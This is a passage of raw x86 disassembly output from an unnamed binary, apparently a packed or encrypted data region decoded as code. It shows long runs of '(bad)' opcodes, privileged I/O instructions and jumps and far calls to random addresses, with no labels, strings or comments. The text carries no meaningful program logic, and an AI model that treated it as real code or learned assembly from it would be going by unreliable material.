  41719d:	cmp    esi,edx
  41719f:	push   0x62
  4171a1:	inc    esp
  4171a2:	mov    edi,ecx
  4171a4:	jb     0x4171f9
  4171a6:	(bad)  
  4171a8:	xchg   DWORD PTR [eax],ebx
  4171aa:	imul   BYTE PTR [ebx]
  4171ac:	fstp   TBYTE PTR [ebp+0x12]
  4171af:	jp     0x4171d7
  4171b1:	pop    ecx
  4171b2:	pop    ecx
  4171b3:	outs   dx,BYTE PTR ds:[esi]
  4171b4:	or     dl,BYTE PTR [edx-0x5579ee20]
  4171ba:	loop   0x417192
  4171bc:	stos   BYTE PTR es:[edi],al
  4171bd:	jg     0x417197
  4171bf:	push   ebx
  4171c0:	sar    ch,cl
  4171c2:	pop    edx
  4171c3:	add    DWORD PTR [ecx+0x0],esi
  4171c6:	pusha  
  4171c7:	(bad)  
  4171c8:	rol    DWORD PTR [ebp+0x4969a9b6],1
  4171ce:	call   0xdcaf:0x43c7b878
  4171d5:	or     ah,BYTE PTR [ebx-0x5141c20c]
  4171db:	pop    esp
  4171dc:	and    ch,BYTE PTR [edx-0x40]
  4171df:	and    al,0x38
  4171e1:	je     0x417178
  4171e3:	retf   
  4171e4:	pushf  
  4171e5:	push   ds
  4171e6:	pop    ebx
  4171e7:	jecxz  0x41719d
  4171e9:	stos   BYTE PTR es:[edi],al
  4171ea:	sbb    ebx,ebx
  4171ec:	xlat   BYTE PTR ds:[ebx]
  4171ed:	and    DWORD PTR [eax-0x57],esp
  4171f0:	popa   
  4171f1:	arpl   ax,cx
  4171f3:	fstp   TBYTE PTR [ebx-0x69]
  4171f6:	fst    QWORD PTR [ebx]
  4171f8:	daa    
  4171f9:	sub    dl,BYTE PTR [ebx-0x19]
  4171fc:	sbb    BYTE PTR [ecx],dh
  4171fe:	jle    0x4171d4
  417200:	das    
  417201:	retf   0xcc76
  417204:	mov    ecx,0xe0b1f95a
  417209:	adc    DWORD PTR [eax+0x1a],edi
  41720c:	add    eax,0x2304cc26
  417211:	cmp    ch,BYTE PTR [edx+edi*8-0x4d67fe23]
  417218:	pop    ebx
  417219:	outs   dx,BYTE PTR ds:[esi]
  41721a:	xlat   BYTE PTR ds:[ebx]
  41721b:	or     DWORD PTR [ebx+0x61],esp
  41721e:	aas    
  41721f:	rol    BYTE PTR [edi],1
  417221:	jecxz  0x41723d
  417223:	and    al,0x15
  417225:	adc    DWORD PTR [ebx],ebp
  417227:	jo     0x41728c
  417229:	cld    
  41722a:	std    
  41722b:	xchg   ebp,eax
  41722c:	dec    edi
  41722d:	mov    BYTE PTR [edi+0x5fb05ff1],dl
  417233:	test   al,0x51
  417235:	js     0x41727e
  417237:	jg     0x417271
  417239:	enter  0x444c,0xc1
  41723d:	sbb    ch,al
  41723f:	mov    dh,0x5f
  417241:	inc    eax
  417242:	or     bh,bh
  417244:	in     eax,0x6e
  417246:	jl     0x4171ed
  417248:	fldenv [ebx-0x36]
  41724b:	cmp    ah,bl
  41724d:	and    edx,DWORD PTR [edi]
  41724f:	fbstp  TBYTE PTR [ecx-0x2f]
  417252:	mov    esi,0x813d4c95
  417257:	jg     0x4172cf
  417259:	cld    
  41725a:	jno    0x417247
  41725c:	scas   eax,DWORD PTR es:[edi]
  41725d:	mov    al,ds:0x5189697d
  417262:	dec    edi
  417263:	test   eax,0xe6fe0a9
  417268:	call   0xe5e9:0x48a9dbd0
  41726f:	ret    
  417270:	popa   
  417271:	bound  eax,QWORD PTR [eax-0x3e]
  417274:	out    dx,al
  417275:	mov    esi,ecx
  417277:	clc    
  417278:	or     al,bh
  41727a:	daa    
  41727b:	dec    ebx
  41727c:	into   
  41727d:	add    al,0xed
  41727f:	mov    ebx,0x28db2fcb
  417284:	mov    ah,0xa9
  417286:	cli    
  417287:	mov    ds,WORD PTR [eax]
  417289:	inc    eax
  41728a:	xor    BYTE PTR [edx+edx*8+0x41],ah
  41728e:	pop    ecx
  41728f:	mov    dh,BYTE PTR [ebx+0x35]
  417292:	push   ecx
  417293:	fcom   DWORD PTR [edx-0x23]
  417296:	test   eax,0xfaa6e185
  41729b:	shr    DWORD PTR [eax],0x7e
  41729e:	pop    eax
  41729f:	js     0x41729d
  4172a1:	fs jbe 0x41726e
  4172a4:	xor    al,dh
  4172a6:	inc    esp
  4172a7:	push   0xfffffff0
  4172a9:	jge    0x41730c
  4172ab:	sub    BYTE PTR [ebx+0x27],0x3f
  4172af:	push   ss
  4172b0:	test   DWORD PTR ds:[eax],edx
  4172b3:	(bad)  
  4172b4:	repnz add al,BYTE PTR [esi]
  4172b7:	(bad)  
  4172b8:	jne    0x4172b2
  4172ba:	xchg   edx,eax
  4172bb:	es pusha 
  4172bd:	test   eax,0x1642eb8a
  4172c2:	iret   
  4172c3:	lahf   
  4172c4:	clc    
  4172c5:	xchg   edx,eax
  4172c6:	mov    edx,0x9e13ff32
  4172cb:	pop    esp
  4172cc:	xor    al,0x19
  4172ce:	adc    bl,BYTE PTR [edx]
  4172d0:	lds    esp,FWORD PTR [ebx-0x774fc3b6]
  4172d6:	call   0x6de0314f
  4172db:	or     al,0x43
  4172dd:	inc    edx
  4172de:	into   
  4172df:	aas    
  4172e0:	mov    ch,cl
  4172e2:	jne    0x417355
  4172e4:	call   FWORD PTR [ebp-0x4]
  4172e7:	and    esp,DWORD PTR [edx-0x44]
  4172ea:	cdq    
  4172eb:	mov    esp,0xafc7142d
  4172f0:	lods   al,BYTE PTR ds:[esi]
  4172f1:	jo     0x4172a7
  4172f3:	inc    edi
  4172f4:	and    al,0x8a
  4172f6:	test   BYTE PTR ds:0xf2827b8c,ah
  4172fc:	hlt    
  4172fd:	add    al,0xad
  4172ff:	jge    0x4172ef
  417301:	or     dh,BYTE PTR ds:0x50e4c9f
  417307:	cmp    al,0xbc
  417309:	shl    BYTE PTR [ecx],1
  41730b:	inc    esp
  41730c:	call   DWORD PTR [ebp-0x62]
  41730f:	mov    WORD PTR [edi+0x47],fs
  417312:	jge    0x4172f7
  417314:	mov    esp,0x16c0ae00
  417319:	mov    edx,0x78c2c873
  41731e:	stc    
  41731f:	popf   
  417320:	mov    edi,0xc881d956
  417325:	and    BYTE PTR [ebp-0x1b],ah
  417328:	jae    0x417333
  41732a:	or     BYTE PTR [ebx+eiz*2+0x22f12419],dh
  417331:	sbb    BYTE PTR [ecx+0x2b],bl
  417334:	sbb    BYTE PTR [esi],ch
  417336:	adc    al,0xec
  417338:	jg     0x417334
  41733a:	fucomp st(6)
  41733c:	retf   
  41733d:	mov    eax,0x4a920c8d
  417342:	mov    DWORD PTR [ebp+0x77fd327],esp
  417348:	jp     0x417348
  41734a:	daa    
  41734b:	scas   eax,DWORD PTR es:[edi]
  41734c:	xchg   DWORD PTR [esi+0x2b],edi
  41734f:	adc    BYTE PTR [eax+edx*8+0x16],dl
  417353:	sub    edi,DWORD PTR [ebp-0x28]
  417356:	aas    
  417357:	jo     0x4172d9
  417359:	test   eax,0x972cda34
  41735e:	jmp    0x417354
  417360:	mov    ah,0x6f
  417362:	push   ss
  417363:	adc    al,0xb8
  417365:	outs   dx,BYTE PTR ds:[esi]
  417366:	pop    esp
  417367:	or     eax,0x633cb250
  41736c:	pushf  
  41736d:	ret    0x837a
  417370:	and    al,0xba
  417373:	test   al,0xa3
  417375:	js     0x4173b2
  417377:	ror    edi,cl
  417379:	push   es
  41737a:	stos   DWORD PTR es:[edi],eax
  41737b:	outs   dx,BYTE PTR es:[esi]
  41737d:	pop    ebp
  41737e:	dec    esi
  41737f:	dec    edx
  417380:	pop    es
  417381:	jg     0x417356
  417383:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417384:	retf   0xc1db
  417387:	(bad)  
  417388:	xchg   edi,eax
  417389:	add    al,0x39
  41738b:	dec    eax
  41738c:	sbb    BYTE PTR [ecx+0x40f9ab34],0x49
  417393:	aas    
  417394:	pusha  
  417395:	dec    edx
  417396:	xlat   BYTE PTR ds:[ebx]
  417397:	idiv   BYTE PTR [esi]
  417399:	or     eax,0x51d5d266
  41739e:	outs   dx,BYTE PTR ds:[esi]
  41739f:	popa   
  4173a0:	out    0xd8,eax
  4173a2:	es mov ah,0x95
  4173a5:	cmp    dl,al
  4173a7:	pop    esi
  4173a8:	push   ds
  4173a9:	dec    esi
  4173aa:	xor    DWORD PTR [esi-0x6d],ebp
  4173ad:	pop    ss
  4173ae:	outs   dx,DWORD PTR ds:[esi]
  4173af:	add    BYTE PTR [esi],cl
  4173b1:	xchg   esp,eax
  4173b2:	jle    0x4173e0
  4173b4:	sbb    BYTE PTR [edi],cl
  4173b6:	outs   dx,DWORD PTR fs:[esi]
  4173b8:	and    BYTE PTR [edx+edx*2+0x5b056b7f],dh
  4173bf:	sbb    DWORD PTR [ebp-0x3],edi
  4173c2:	ret    0xe9a3
  4173c5:	cli    
  4173c6:	mov    gs,WORD PTR [ecx+0x4364abfe]
  4173cc:	jp     0x417409
  4173ce:	mov    ch,0xd4
  4173d0:	and    ch,bl
  4173d2:	dec    ebx
  4173d3:	add    eax,0xc533a7ae
  4173d8:	inc    ecx
  4173d9:	xor    eax,DWORD PTR [ebx]
  4173db:	or     al,0xd
  4173dd:	add    eax,0xfaecc57d
  4173e2:	mov    esp,0x18825fa1
  4173e7:	arpl   WORD PTR [ecx+ebp*1+0x55],si
  4173eb:	test   BYTE PTR [edi],bl
  4173ed:	test   BYTE PTR [ebx],ch
  4173ef:	and    BYTE PTR es:0x29f6ccc0,0x82
  4173f7:	es mov ebx,0x612cbacd
  4173fd:	lods   eax,DWORD PTR ds:[esi]
  4173fe:	mov    cs,WORD PTR [edi-0x6a8676b0]
  417404:	push   ebx
  417405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417406:	adc    eax,0xecd599c4
  41740b:	inc    esi
  41740c:	jnp    0x41739a
  41740e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41740f:	js     0x417448
  417411:	inc    ebp
  417412:	(bad)  
  417413:	aas    
  417414:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417415:	scas   al,BYTE PTR es:[edi]
  417416:	retf   0x7d7
  417419:	lds    esi,FWORD PTR [esi]
  41741b:	shl    DWORD PTR [ebx+0x11454e29],1
  417421:	jecxz  0x41743d
  417423:	pop    eax
  417424:	sar    DWORD PTR [esi+0x65],1
  417427:	mov    esp,0x503b4635
  41742c:	test   eax,0xe63eb6dc
  417431:	add    ah,BYTE PTR [eax+ebx*2+0x3e89ff9a]
  417438:	in     eax,dx
  417439:	popa   
  41743a:	ds add edi,0xf09e1865
  417441:	jns    0x417441
  417443:	inc    eax
  417444:	and    edi,DWORD PTR [ebx]
  417446:	mov    ds:0xf3803f9a,eax
  41744b:	mov    dh,0x8d
  41744d:	xor    DWORD PTR [ebp-0x31],edx
  417450:	shl    DWORD PTR [ebp-0x16],0x17
  417454:	and    DWORD PTR [bp+si],esi
  417457:	sbb    al,0xb9
  417459:	and    al,0x2e
  41745b:	dec    eax
  41745c:	cmp    al,0x1c
  41745e:	pop    ds
  41745f:	pop    esi
  417460:	retf   
  417461:	retf   
  417462:	mov    ds:0xc285637,eax
  417467:	push   cs
  417468:	mov    ebp,DWORD PTR [ebx-0x70c5731c]
  41746e:	jmp    0xa329:0x4f912eb4
  417475:	jle    0x417468
  417477:	ds in  al,0x43
  41747a:	mov    edi,0xe90d698c
  41747f:	adc    eax,0xef917bac
  417484:	call   DWORD PTR [esi]
  417486:	dec    eax
  417487:	call   0x5a287546
  41748c:	push   ebp
  41748d:	fnstenv [edi-0x3a]
  417490:	xchg   esp,eax
  417491:	pop    ds
  417492:	or     eax,esi
  417494:	imul   esi,DWORD PTR [edx],0x2b
  417497:	fs repnz pop es
  41749a:	cmp    BYTE PTR [ebp-0x16a1a04],ah
  4174a0:	leave  
  4174a1:	sti    
  4174a2:	cwde   
  4174a3:	xchg   ecx,eax
  4174a4:	sbb    DWORD PTR [ebx-0x77823d1b],eax
  4174aa:	sbb    eax,0x43f2c238
  4174af:	push   0x6960e930
  4174b4:	xchg   esi,eax
  4174b5:	rcl    BYTE PTR [edx],1
  4174b7:	adc    DWORD PTR [eax],0xfffffff7
  4174ba:	cs xchg ecx,eax
  4174bc:	mov    WORD PTR [ebx],ss
  4174be:	sub    al,0xa2
  4174c0:	fisttp DWORD PTR [ebp-0x7c]
  4174c3:	mov    al,ds:0xfd2bce4b
  4174c8:	jmp    0x9c6245b9
  4174cd:	inc    ecx
  4174ce:	fnsave ds:0x32aa4d78
  4174d4:	xchg   ecx,eax
  4174d5:	jae    0x41749c
  4174d7:	scas   eax,DWORD PTR es:[edi]
  4174d8:	arpl   WORD PTR [ebx+0x4e],dx
  4174db:	xbegin 0xf32528e7
  4174e1:	and    dh,BYTE PTR [ebx+ecx*1]
  4174e4:	jnp    0x417534
  4174e6:	sbb    BYTE PTR [esp+edi*2],dl
  4174e9:	adc    al,bl
  4174eb:	xor    DWORD PTR [esi-0x47],ecx
  4174ee:	lahf   
  4174ef:	jg     0x41752c
  4174f1:	lods   al,BYTE PTR ds:[esi]
  4174f2:	stos   BYTE PTR es:[edi],al
  4174f3:	sti    
  4174f4:	rcl    BYTE PTR [ebx-0x7e],1
  4174f7:	jnp    0x4174f3
  4174f9:	pop    edx
  4174fa:	stos   DWORD PTR es:[edi],eax
  4174fb:	es std 
  4174fd:	jg     0x417523
  4174ff:	in     eax,dx
  417500:	rcl    BYTE PTR [ecx+0x69ab8633],cl
  417506:	pop    ds
  417507:	push   cs
  417508:	fisub  DWORD PTR [ebp+0x3e]
  41750b:	pop    esi
  41750c:	hlt    
  41750d:	mov    bl,0xa6
  41750f:	das    
  417510:	dec    ebp
  417511:	fild   WORD PTR [ebp+0x46d589f2]
  417517:	and    bl,BYTE PTR [eax-0x10]
  41751a:	xor    eax,0x5865e4c3
  41751f:	jecxz  0x417548
  417521:	retf   
  417522:	jge    0x4174cb
  417524:	retf   0xa7db
  417527:	stc    
  417528:	ins    BYTE PTR es:[edi],dx
  417529:	les    eax,FWORD PTR [ecx]
  41752b:	mov    dh,bl
  41752d:	sub    dh,cl
  41752f:	psadbw mm5,QWORD PTR [edx+eiz*1]
  417533:	pop    edi
  417534:	sar    BYTE PTR [ecx-0x5c],1
  417537:	fstp   st(6)
  417539:	mov    ds:0x9569eccb,eax
  41753e:	(bad)  
  41753f:	mov    bh,BYTE PTR [esi]
  417541:	mov    ch,0x3e
  417543:	(bad)  
  417544:	rcr    DWORD PTR [edx+0x4ab82375],1
  41754a:	push   eax
  41754c:	mov    ecx,0x1de8543d
  417551:	cmp    cl,bh
  417553:	cmc    
  417554:	sub    ch,BYTE PTR [edx]
  417556:	jae    0x417589
  417558:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417559:	pop    esp
  41755a:	push   esi
  41755b:	enter  0xf19f,0x3d
  41755f:	aaa    
  417560:	pop    ebp
  417561:	scas   al,BYTE PTR es:[edi]
  417562:	inc    ecx
  417563:	add    ah,BYTE PTR [ebx-0x7e]
  417566:	mov    esp,0x15472a64
  41756b:	loopne 0x4174ff
  41756d:	push   0xffffffd7
  41756f:	popf   
  417570:	(bad)  
  417571:	mov    ebp,0x869c8df9
  417576:	jmp    0x41752b
  417578:	add    ah,ch
  41757a:	emms   
  41757c:	mov    cl,0x31
  41757e:	push   0x48
  417580:	scas   al,BYTE PTR es:[edi]
  417581:	test   al,0x99
  417583:	sbb    eax,0xe2897c59
  417588:	jo     0x417547
  41758a:	rcr    BYTE PTR [eax+0x1d1ef135],1
  417590:	jle    0x417549
  417592:	(bad)  [edi+0x1d]
  417595:	inc    esp
  417596:	jmp    0xba1e:0x5573183f
  41759d:	fimul  WORD PTR ds:0x35167899
  4175a3:	mov    edx,0xcf85bcac
  4175a8:	cld    
  4175a9:	pop    ebx
  4175aa:	cmp    eax,0xa2e360c1
  4175af:	dec    ebp
  4175b0:	les    esp,FWORD PTR [ebp+0x480f3849]
  4175b6:	jne    0x41756e
  4175b8:	(bad)  
  4175ba:	xchg   ebp,eax
  4175bb:	mov    al,ds:0x13f426e8
  4175c0:	mov    edi,0x147dd6e3
  4175c5:	mov    cl,0x2d
  4175c7:	mov    bl,0xeb
  4175c9:	sub    al,0x1d
  4175cb:	mov    esi,0x54530b0f
  4175d0:	dec    ebx
  4175d1:	push   0x62421839
  4175d6:	xchg   ebp,eax
  4175d7:	inc    esp
  4175d8:	test   dl,0xa5
  4175db:	xor    bl,al
  4175dd:	jns    0x417579
  4175df:	arpl   WORD PTR [ebx+edx*8+0x72ea2d81],bp
  4175e6:	mov    bl,BYTE PTR [edi+0x33825365]
  4175ec:	or     ah,BYTE PTR [edx]
  4175ee:	enter  0x814d,0x97
  4175f2:	les    ebx,FWORD PTR [edi+0x10]
  4175f5:	jbe    0x417657
  4175f7:	xor    eax,0x969e1563
  4175fc:	sub    ebx,edi
  4175fe:	adc    eax,edx
  417600:	xchg   BYTE PTR [edx-0x439417c4],bl
  417606:	cmp    esi,DWORD PTR [edx-0x6c]
  417609:	add    edi,DWORD PTR [edx-0x16015a63]
  41760f:	mov    bl,0xf5
  417611:	or     BYTE PTR [edx+0x42],bl
  417614:	inc    esp
  417615:	movntq QWORD PTR ds:0x82bc49fa,mm1
  41761c:	mov    cl,ch
  41761e:	setle  BYTE PTR [ecx+0x6b774c11]
  417625:	(bad)  
  417626:	iret   
  417627:	mov    dl,0xd9
  417629:	jle    0x41761a
  41762b:	cmp    dh,BYTE PTR [ecx]
  41762d:	mov    eax,ds:0xd791ad32
  417632:	lea    edi,es:[edi-0x57]
  417636:	test   BYTE PTR [ecx-0x364f4cac],0x3
  41763d:	or     BYTE PTR [edx-0x50f8f8cd],0x5f
  417644:	jns    0x4175c7
  417646:	or     ecx,DWORD PTR [edx]
  417648:	ror    BYTE PTR [ebx-0x2e],1
  41764b:	pop    edx
  41764c:	(bad)  
  41764d:	pop    ecx
  41764e:	cmp    DWORD PTR [ebp-0x3f6032aa],esi
  417654:	repnz lods eax,DWORD PTR ds:[esi]
  417656:	xor    BYTE PTR [esi+0x4],al
  417659:	pop    esi
  41765a:	or     eax,0xb600565b
  41765f:	add    edx,DWORD PTR [ecx+0x2e769cbd]
  417665:	call   0xd4e64236
  41766a:	inc    ecx
  41766b:	jle    0x4175fb
  41766d:	mov    BYTE PTR [esi+0x56],al
  417670:	push   ebp
  417671:	ret    0x1605
  417674:	imul   esp,DWORD PTR [edi],0x9da86359
  41767a:	(bad)  
  41767b:	and    eax,0x8ac19aa0
  417680:	xor    dl,BYTE PTR [eax+0x4ec7ffa3]
  417686:	inc    ebp
  417687:	inc    esp
  417688:	sub    DWORD PTR [ebp-0x64c47f2f],ebp
  41768e:	pop    ds
  41768f:	loope  0x417695
  417691:	ins    DWORD PTR es:[edi],dx
  417692:	push   edi
  417693:	push   0xffffffa6
  417695:	sbb    BYTE PTR [edx],al
  417697:	xchg   esi,eax
  417698:	dec    esp
  417699:	xchg   edx,eax
  41769a:	pop    eax
  41769b:	push   ebx
  41769c:	mov    dh,0x19
  41769e:	pop    esi
  41769f:	inc    edi
  4176a0:	cli    
  4176a1:	add    dh,dh
  4176a3:	bound  eax,QWORD PTR [ebp+0x4d]
  4176a6:	shl    cl,1
  4176a8:	sbb    BYTE PTR [edx+0x675fab9c],0xd3
  4176af:	stc    
  4176b0:	sti    
  4176b1:	fisttp QWORD PTR [ebx+0x5c58fdb3]
  4176b7:	push   ebp
  4176b8:	mov    bl,0x84
  4176ba:	jl     0x417725
  4176bc:	and    BYTE PTR [edx-0x18caf123],dh
  4176c2:	push   edi
  4176c3:	and    esp,DWORD PTR [ebx-0x7c]
  4176c6:	test   DWORD PTR [edi+0x3213fc8e],ebp
  4176cc:	test   BYTE PTR [ebp+esi*4+0x4918e693],al
  4176d3:	vpsraw ymm0,ymm6,xmm4
  4176d7:	into   
  4176d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176d9:	mov    dh,dl
  4176db:	nop
  4176dc:	and    eax,DWORD PTR [ebx+0x3d3fdb18]
  4176e2:	sub    DWORD PTR [esi-0x45],ebp
  4176e5:	es jecxz 0x4176c5
  4176e8:	retf   
  4176e9:	mov    al,BYTE PTR [edx+edx*4]
  4176ec:	mov    bl,0xda
  4176ee:	pushf  
  4176ef:	adc    DWORD PTR [ecx+0x148f7354],ebx
  4176f5:	cmp    eax,0x29fd9559
  4176fa:	idiv   BYTE PTR [eax+0x3c]
  4176fd:	ins    DWORD PTR es:[edi],dx
  4176fe:	mov    dh,0x1e
  417700:	(bad)  
  417701:	fisttp QWORD PTR [ebp+ecx*8+0x4a7821c4]
  417708:	fisttp DWORD PTR [eax+0x2b8ee93c]
  41770e:	mov    dl,0xa
  417710:	dec    edx
  417711:	jl     0x417733
  417713:	pop    eax
  417714:	add    cl,BYTE PTR [edx-0x271181d0]
  41771a:	out    0x3e,al
  41771c:	adc    eax,0xf82b2166
  417721:	in     eax,0x10
  417723:	jl     0x4176db
  417725:	mov    eax,0x257789ca
  41772a:	pop    ecx
  41772b:	mov    bl,0xae
  41772d:	repnz fwait
  41772f:	adc    al,BYTE PTR [edx-0x4534ad2]
  417735:	imul   ebx,esp,0xe3558a67
  41773b:	mov    es,WORD PTR [ecx+ebx*1-0x1846bcb3]
  417742:	loopne 0x417726
  417744:	mov    dl,0xfd
  417746:	xchg   esi,eax
  417747:	popf   
  417748:	push   esp
  417749:	and    ch,bh
  41774b:	and    BYTE PTR [ebx+0x6e],cl
  41774e:	aam    0xbc
  417750:	xchg   BYTE PTR [esi-0x3b110e86],dl
  417756:	mov    ah,0xb5
  417758:	lahf   
  417759:	push   ebx
  41775a:	popf   
  41775b:	add    eax,0xd4749703
  417760:	lods   eax,DWORD PTR ds:[esi]
  417761:	mov    dl,0x47
  417763:	xor    al,BYTE PTR [esi]
  417765:	jnp    0x417732
  417767:	outs   dx,BYTE PTR ds:[esi]
  417768:	stc    
  417769:	xor    BYTE PTR [ebx-0x3f],bl
  41776c:	dec    edx
  41776d:	inc    ebx
  41776e:	ror    BYTE PTR [ebx-0x5d],1
  417771:	push   edi
  417772:	and    eax,DWORD PTR fs:[edi]
  417775:	add    BYTE PTR [ecx],ah
  417777:	xchg   edx,eax
  417778:	(bad)  
  41777a:	xchg   esp,eax
  41777b:	cmp    eax,0xfa727f5f
  417780:	xchg   esi,eax
  417781:	and    DWORD PTR [edi],ebp
  417783:	push   ebx
  417784:	add    ebp,DWORD PTR [ecx]
  417786:	(bad)  
  417787:	mov    ebp,0xd9288c21
  41778c:	sub    al,0x11
  41778e:	pusha  
  41778f:	jp     0x417736
  417791:	push   ds
  417792:	mov    dh,0x8c
  417794:	shl    BYTE PTR ds:0xd50d9ee,1
  41779a:	nop
  41779b:	xor    DWORD PTR [edi-0x53],ebx
  41779e:	jne    0x417788
  4177a0:	js     0x41772c
  4177a2:	sbb    DWORD PTR [ebx],edi
  4177a4:	shl    DWORD PTR [esi-0x61a273d0],cl
  4177aa:	adc    eax,eax
  4177ac:	dec    ebp
  4177ad:	outs   dx,BYTE PTR ds:[esi]
  4177ae:	not    DWORD PTR [edx+0x45a40200]
  4177b4:	adc    al,0xbc
  4177b6:	pop    DWORD PTR [edi-0x5f]
  4177b9:	jp     0x4177f4
  4177bb:	and    BYTE PTR [esi+0x28b50b85],0x5
  4177c2:	retf   
  4177c3:	mov    edi,0x6212f1b1
  4177c8:	pop    eax
  4177c9:	aas    
  4177ca:	push   0xe2dab6a3
  4177cf:	cld    
  4177d0:	pop    ebp
  4177d1:	push   cs
  4177d2:	dec    edx
  4177d3:	sbb    ah,dl
  4177d5:	outs   dx,BYTE PTR ds:[esi]
  4177d6:	pushf  
  4177d7:	inc    esp
  4177d8:	xchg   DWORD PTR [ebx-0x8],ecx
  4177db:	scas   eax,DWORD PTR es:[edi]
  4177dc:	fcomp  QWORD PTR [eax-0x32]
  4177df:	outs   dx,DWORD PTR ds:[esi]
  4177e0:	inc    ebp
  4177e1:	repnz lods al,BYTE PTR ds:[esi]
  4177e3:	lock or bh,BYTE PTR [ebp+edx*8+0x22a09c6e]
  4177eb:	and    DWORD PTR [esi-0x7cdf1b7b],edx
  4177f1:	mov    dl,0x4
  4177f3:	dec    ebp
  4177f4:	inc    ebx
  4177f5:	or     al,0xc5
  4177f7:	arpl   dx,ax
  4177f9:	fmul   QWORD PTR [edx]
  4177fb:	mov    eax,0xc5ab94d9
  417800:	int    0x6b
  417802:	in     al,0x93
  417804:	stos   BYTE PTR es:[edi],al
  417805:	jge    0x41780f
  417807:	hlt    
  417808:	scas   eax,DWORD PTR es:[edi]
  417809:	sbb    dh,BYTE PTR [edx+0x6bdf63ec]
  41780f:	or     ch,BYTE PTR [eax+0x3d7e2dfd]
  417815:	scas   eax,DWORD PTR es:[edi]
  417816:	mov    edx,eax
  417818:	xor    al,ch
  41781a:	jmp    0x41779f
  41781c:	xchg   DWORD PTR [ecx+0x2f7789e1],esi
  417822:	push   ebp
  417823:	lea    ecx,[esi+0x3e93e2cc]
  417829:	xor    al,0x31
  41782b:	lods   al,BYTE PTR ds:[esi]
  41782c:	lods   al,BYTE PTR ds:[esi]
  41782d:	xchg   esi,eax
  41782e:	iret   
  41782f:	pop    ds
  417830:	les    ebp,FWORD PTR [esi-0x32]
  417833:	sar    DWORD PTR [edx],0x87
  417836:	xor    al,0xc9
  417838:	in     al,dx
  417839:	sub    ch,BYTE PTR [eax+0x2c885043]
  41783f:	xor    al,0x3f
  417841:	shr    edi,cl
  417843:	aaa    
  417844:	mov    eax,ds:0xe6695e68
  417849:	pusha  
  41784a:	xchg   DWORD PTR [ebx],eax
  41784c:	outs   dx,BYTE PTR ds:[esi]
  41784d:	retf   
  41784e:	in     al,0x2f
  417850:	mov    bh,0x60
  417852:	fcom   QWORD PTR [esi]
  417854:	xchg   esp,eax
  417855:	aam    0xcf
  417857:	mov    al,ds:0x15f81ea4
  41785c:	push   ss
  41785d:	ficom  DWORD PTR [ebx+0x126f0bdd]
  417863:	int    0x64
  417865:	xchg   ebx,eax
  417866:	sub    eax,0x172fc492
  41786b:	jge    0x417809
  41786d:	pop    esi
  41786e:	sbb    DWORD PTR [ecx-0x2d7a999d],eax
  417874:	or     BYTE PTR [esi+ecx*2-0x6],bh
  417878:	xchg   ebp,eax
  417879:	xchg   ebx,eax
  41787a:	sbb    DWORD PTR [edi],edi
  41787c:	outs   dx,DWORD PTR ds:[esi]
  41787d:	or     BYTE PTR [esp+eiz*4-0x41],ch
  417881:	pop    ebx
  417882:	loop   0x4178a1
  417884:	or     edi,DWORD PTR [edx+0x7e09e5bc]
  41788a:	inc    ebx
  41788b:	fadd   DWORD PTR [esi-0x4f999b85]
  417891:	cli    
  417892:	fcom   DWORD PTR [ebp-0x5e]
  417895:	int3   
  417896:	sub    BYTE PTR [edx-0x64],dh
  417899:	adc    BYTE PTR [ecx],0x40
  41789c:	ss xor eax,0xc1de1f4c
  4178a2:	pop    eax
  4178a3:	push   edx
  4178a4:	in     eax,0xbb
  4178a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178a7:	clc    
  4178a8:	sbb    eax,0x30505ec2
  4178ad:	jnp    0x4178cd
  4178af:	inc    ebx
  4178b0:	xchg   esp,eax
  4178b1:	or     BYTE PTR [ecx],dl
  4178b3:	jle    0x41787c
  4178b5:	mov    edi,DWORD PTR [esi]
  4178b7:	pop    eax
  4178b8:	fst    DWORD PTR [ecx]
  4178ba:	int    0x6b
  4178bc:	pop    ebx
  4178bd:	jne    0x4178b2
  4178bf:	int3   
  4178c0:	add    eax,0xe5b3c41a
  4178c5:	lods   eax,DWORD PTR ds:[esi]
  4178c6:	xchg   ecx,eax
  4178c7:	out    dx,al
  4178c8:	xor    ch,dl
  4178ca:	pop    edi
  4178cb:	retf   0x7cf2
  4178ce:	leave  
  4178cf:	jo     0x417905
  4178d1:	dec    esp
  4178d2:	sub    ebp,DWORD PTR [ecx-0x4e]
  4178d5:	mov    edx,0xcffde08f
  4178da:	adc    BYTE PTR [esi],0xce
  4178dd:	inc    ebx
  4178de:	sbb    ecx,edx
  4178e0:	shr    DWORD PTR [edx-0x70],1
  4178e3:	pusha  
  4178e4:	cwde   
  4178e5:	ret    0xc2a9
  4178e8:	sub    eax,0xe0406232
  4178ed:	ins    BYTE PTR es:[edi],dx
  4178ee:	ss push es
  4178f0:	cdq    
  4178f1:	out    0x2e,eax
  4178f3:	and    eax,0xa7ecd6dd
  4178f8:	ss ret 
  4178fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178fb:	gs dec esi
  4178fd:	aam    0xa0
  4178ff:	pop    ss
  417900:	push   ss
  417901:	das    
  417902:	jmp    0x560e3824
  417907:	sbb    eax,0x72853a08
  41790c:	pop    ss
  41790d:	sahf   
  41790e:	dec    ebx
  41790f:	add    eax,0xa4ac50a5
  417914:	sti    
  417915:	cmp    al,0x97
  417917:	dec    esi
  417918:	je     0x417965
  41791a:	or     ecx,esi
  41791c:	lea    edx,[esi]
  41791e:	xlat   BYTE PTR ds:[ebx]
  41791f:	scas   al,BYTE PTR es:[edi]
  417920:	imul   ebx,edx,0x7f
  417923:	xchg   esi,eax
  417924:	arpl   cx,sp
  417926:	or     BYTE PTR [edx+0x66a13931],al
  41792c:	out    dx,al
  41792d:	les    ebp,FWORD PTR [ecx-0x45]
  417930:	xor    DWORD PTR [edi],0x6fa7145
  417936:	xor    dh,BYTE PTR [edx+0x1b3e775b]
  41793c:	cld    
  41793d:	mov    dl,0xad
  41793f:	xchg   esp,eax
  417940:	add    eax,0xe3830aa5
  417945:	dec    esi
  417946:	mov    eax,0x4ce8a245
  41794b:	aad    0x6c
  41794d:	in     eax,0xb8
  41794f:	pop    edi
  417950:	sbb    edx,esi
  417952:	imul   ecx
